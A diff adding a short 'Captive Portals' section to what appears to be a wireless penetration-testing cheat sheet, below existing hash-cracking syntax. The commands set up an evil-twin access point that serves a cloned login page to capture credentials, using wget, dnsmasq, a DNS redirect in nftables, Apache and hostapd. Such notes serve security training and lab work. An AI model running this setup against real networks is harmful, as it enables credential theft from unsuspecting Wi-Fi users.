@@ -137,3 +137,41 @@ Hashcat and John syntax
 sudo hashcat -m 5500 <hashfile> <wordlist> 
 john --format=netntlm <hashfile> --wordlist=<wordlist>
 ```
+
+# Captive Portals
+```
+sudo apt install apache2 libapache2-mod-php
+wget -r -l2 <site to clone>
+```
+
+create index.php from wget, copy needed files to /var/www/html/portal
+
+copy login_check.php to /var/www/html/portal
+
+set up network
+```sudo ip addr add 192.168.87.1/24 dev wlan0
+sudo ip link set wlan0 up
+sudo apt install dnsmasq
+```
+create mco-dnsmasq.conf file and start dnsmasq
+```
+sudo dnsmasq --conf-file=mco-dnsmasq.conf
+verify dns
+sudo netstat -lnp
+```
+
+Install nftables if needed
+```
+sudo apt install nftables
+sudo nft add table ip nat
+sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
+sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
+```
+Update apache to use ssl
+```
+sudo a2enmod ssl
+sudo systemctl restart apache2
+```
+
+start the evil twin with the mco-hostapd.conf file
+```sudo hostapd -B mco-hostapd.conf```
